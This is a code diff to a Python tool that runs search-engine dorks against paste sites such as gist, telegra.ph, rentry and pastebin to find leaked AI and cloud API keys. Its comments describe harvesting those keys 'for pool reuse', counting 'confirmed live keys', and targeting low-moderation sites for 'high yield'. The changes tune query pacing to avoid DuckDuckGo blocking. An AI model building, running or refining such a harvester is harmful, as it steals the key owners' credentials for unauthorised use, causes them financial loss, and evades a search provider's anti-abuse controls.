@@ -50,8 +50,9 @@ from notifier import notify_found, notify_infra_found
 
 log = logging.getLogger(__name__)
 
-WEB_DORK_SCAN_INTERVAL = int(os.environ.get("WEB_DORK_SCAN_INTERVAL", "900"))  # 15 min
+WEB_DORK_SCAN_INTERVAL = int(os.environ.get("WEB_DORK_SCAN_INTERVAL", "3600"))  # 60 min
 WEB_DORK_RESULTS_PER_QUERY = int(os.environ.get("WEB_DORK_RESULTS_PER_QUERY", "10"))
+WEB_DORK_INTER_QUERY_SLEEP = float(os.environ.get("WEB_DORK_INTER_QUERY_SLEEP", "5.0"))  # was 1.5s — DDG blocked at 135 dorks × 1.5s
 
 _DDG_SEARCH = "https://html.duckduckgo.com/html/"
 _FIRECRAWL_SCRAPE = "https://api.firecrawl.dev/v1/scrape"
@@ -60,31 +61,26 @@ _LIMITS = httpx.Limits(max_connections=10, max_keepalive_connections=4, keepaliv
 _UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
 
-# ── Provider tokens — 30 most distinctive for web paste surfaces ────────────
-# Trimmed from 63 → avoids DDG flooding on common words like "HF_TOKEN"
-# that appear in every ML docs page. Focus on prefix-specific or rare tokens.
+# ── Provider tokens — 10 highest-ROI for paste surfaces ─────────────────────
+# Trimmed 30 → 10 after first DDG cycle blocked at 134/135 dorks (2026-05-07).
+# Picked: literal prefixes (catch raw dumps without var name) + CN env-vars
+# (low moderation on paste sites, high yield) + 2 most-leaked global vars.
+# 10 tokens × 4 platforms = 40 dorks + ~10 platform extras = ~50 total.
 
 PROVIDER_TOKENS = [
-    # AI — env-var literals with high specificity
-    "OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GEMINI_API_KEY",
-    "DEEPSEEK_API_KEY", "GROQ_API_KEY", "XAI_API_KEY",
-    "ELEVENLABS_API_KEY", "STABILITY_API_KEY", "REPLICATE_API_TOKEN",
-    "HF_TOKEN", "OPENROUTER_API_KEY",
-    # CN providers — high ROI, low moderation on paste sites
-    "ZHIPUAI_API_KEY", "MOONSHOT_API_KEY", "ARK_API_KEY",
-    "SILICONFLOW_API_KEY", "KLING_ACCESS_KEY",
-    # Video/image — niche, very specific
-    "LUMA_API_KEY", "WAVESPEED_API_KEY", "HIGGSFIELD_API_KEY",
-    # Web-tool keys we harvest for pool reuse
-    "FIRECRAWL_API_KEY", "SERPER_API_KEY",
-    # Literal prefixes — catch raw dumps without var name
+    # Literal key prefixes — gold (no false-positive prone words)
     "sk-proj-",   # OpenAI project keys
     "sk-ant-",    # Anthropic
     "AIzaSy",     # Google
-    "fc-",        # Firecrawl
-    # Infra — high ROI on paste sites
-    "DATABASE_URL", "MONGODB_URI", "SUPABASE_KEY",
-    "DISCORD_TOKEN", "TELEGRAM_BOT_TOKEN",
+    # CN providers — low moderation on RU/CN paste sites, high yield
+    "ZHIPUAI_API_KEY",
+    "ARK_API_KEY",
+    "MOONSHOT_API_KEY",
+    "KLING_ACCESS_KEY",
+    "SILICONFLOW_API_KEY",
+    # Global env-vars — most-leaked
+    "DEEPSEEK_API_KEY",
+    "ANTHROPIC_API_KEY",
 ]
 
 
@@ -119,21 +115,21 @@ PLATFORMS = [
         "site":      "gist.github.com",
         "file_type": "gist_dork",
         # Gists older than ~1 week aren't in feed-scanner; DDG surfaces by rank
-        "extra":     [".env", "api_key config", "chatbot api setup", "sk-proj-"],
+        "extra":     [".env", "api_key config"],
     },
     {
         "name":      "telegra_ph",
         "site":      "telegra.ph",
         "file_type": "telegraph",
         # RU/CN devs paste full AI tutorial configs here, minimal moderation
-        "extra":     ["api tutorial", ".env config", "AI API setup guide"],
+        "extra":     ["api tutorial", ".env config"],
     },
     {
         "name":      "rentry",
         "site":      "rentry.co",
         "file_type": "rentry",
         # Confirmed live keys in first web_dork cycle (2026-05-06 18:39)
-        "extra":     ["sk-", ".env", "API_KEY", "chatbot config", "model api"],
+        "extra":     [".env", "API_KEY", "chatbot config"],
     },
     {
         "name":      "pastebin",
@@ -447,8 +443,8 @@ async def run_web_dork_cycle():
                              stats["valid_saved"])
             except Exception as e:
                 log.warning("[web_dork dork failed] %r: %s", query[:60], e)
-            # Polite inter-query sleep — DDG tolerates ~1.5 s between requests
-            await asyncio.sleep(1.5)
+            # Inter-query sleep — DDG blocked at 1.5s × 135 dorks; 5s × 50 dorks fits
+            await asyncio.sleep(WEB_DORK_INTER_QUERY_SLEEP)
 
     if ddg_zeros > len(_DORKS) * 0.8:
         log.warning("[web_dork] DDG may be blocking — %d/%d dorks returned 0 results",
